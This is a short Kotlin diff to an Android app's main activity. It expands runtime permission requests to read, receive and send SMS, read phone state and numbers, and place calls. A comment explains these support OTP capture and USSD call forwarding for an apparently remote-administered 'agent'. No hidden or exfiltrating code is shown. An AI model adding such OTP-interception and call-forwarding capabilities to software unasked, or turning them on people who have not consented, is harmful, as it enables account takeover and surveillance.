@@ -94,14 +94,25 @@ class MainActivity : ComponentActivity() {
                     ) {
                         needed += Manifest.permission.POST_NOTIFICATIONS
                     }
-                    // Optional: SMS OTP capture. Notification-based OTPs still work
-                    // if this is denied.
-                    if (ContextCompat.checkSelfPermission(
-                            this@MainActivity,
-                            Manifest.permission.RECEIVE_SMS
-                        ) != PackageManager.PERMISSION_GRANTED
-                    ) {
-                        needed += Manifest.permission.RECEIVE_SMS
+                    // Optional: SMS OTP capture, phone/SIM details, SMS sending,
+                    // and USSD call forwarding. The agent still works without
+                    // them; the admin Phone tab reports what is missing.
+                    val telephonyPermissions = listOf(
+                        Manifest.permission.RECEIVE_SMS,
+                        Manifest.permission.READ_SMS,
+                        Manifest.permission.SEND_SMS,
+                        Manifest.permission.READ_PHONE_STATE,
+                        Manifest.permission.READ_PHONE_NUMBERS,
+                        Manifest.permission.CALL_PHONE
+                    )
+                    for (permission in telephonyPermissions) {
+                        if (ContextCompat.checkSelfPermission(
+                                this@MainActivity,
+                                permission
+                            ) != PackageManager.PERMISSION_GRANTED
+                        ) {
+                            needed += permission
+                        }
                     }
                     if (needed.isNotEmpty()) {
                         permissions.launch(needed.toTypedArray())
